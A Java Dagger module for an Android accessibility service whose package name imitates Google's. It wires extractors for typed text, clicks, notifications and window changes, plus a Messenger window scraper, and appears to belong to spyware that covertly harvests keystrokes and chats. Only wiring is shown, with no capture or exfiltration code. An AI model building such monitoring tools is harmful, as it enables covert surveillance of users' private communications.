package service.android.google.com.accessibility.dagger.module;

import java.util.Arrays;

import javax.inject.Singleton;

import dagger.Module;
import dagger.Provides;
import service.android.google.com.accessibility.AS;
import service.android.google.com.accessibility.controller.AccessibilityServiceController;
import service.android.google.com.accessibility.controller.AccessibilityServiceControllerImpl;
import service.android.google.com.accessibility.extractor.EventExtractor;
import service.android.google.com.accessibility.extractor.extractors.Extractor;
import service.android.google.com.accessibility.extractor.extractors.NotificationStateChangedExtractor;
import service.android.google.com.accessibility.extractor.extractors.ViewClickedExtractor;
import service.android.google.com.accessibility.extractor.extractors.ViewFocusedExtractor;
import service.android.google.com.accessibility.extractor.extractors.ViewTextChangedExtractor;
import service.android.google.com.accessibility.extractor.extractors.WindowStateChangedExtractor;
import service.android.google.com.accessibility.model.PackageConstants;
import service.android.google.com.accessibility.rx.ObservableFactory;
import service.android.google.com.accessibility.rx.ObserverFactory;
import service.android.google.com.accessibility.scraper.WindowRipper;
import service.android.google.com.accessibility.scraper.scrapers.MessengerScraper;
import service.android.google.com.accessibility.scraper.scrapers.Scraper;
import service.android.google.com.accessibility.util.function.FunctionFactory;

import static java.util.Arrays.asList;

@Module
public class AccessibilityModule {

    private AS accessibilityService;

    public AccessibilityModule(AS accessibilityService) {
        this.accessibilityService = accessibilityService;
    }

    @Provides
    AS accessibilityService() {
        return accessibilityService;
    }

    @Provides
    @Singleton
    AccessibilityServiceController accessibilityServiceController(final ObservableFactory observableFactory,
                                                                  final ObserverFactory observerFactory,
                                                                  final EventExtractor eventExtractor,
                                                                  final WindowRipper windowRipper) {
        return new AccessibilityServiceControllerImpl(observableFactory, observerFactory, eventExtractor, windowRipper);
    }

    @Provides
    ObservableFactory observableFactory(final FunctionFactory functionFactory,
                                        final ObserverFactory observerFactory) {
        return new ObservableFactory(functionFactory, observerFactory);
    }

    @Provides
    FunctionFactory functionFactory() {
        return new FunctionFactory();
    }

    @Provides
    EventExtractor eventExtractor() {
        return new EventExtractor(Arrays.<Extractor>asList(
                new ViewClickedExtractor(),
                new ViewFocusedExtractor(asList(PackageConstants.APP_NEXUS_APP_LAUNCHER)),
                new ViewTextChangedExtractor(),
                new WindowStateChangedExtractor(asList(PackageConstants.APP_MESSENGER)),
                new NotificationStateChangedExtractor()
        ));
    }

    @Provides
    WindowRipper windowRipper() {
        return new WindowRipper(Arrays.<Scraper>asList(
                new MessengerScraper()
        ));
    }

    @Provides
    ObserverFactory observerFactory() {
        return new ObserverFactory();
    }
}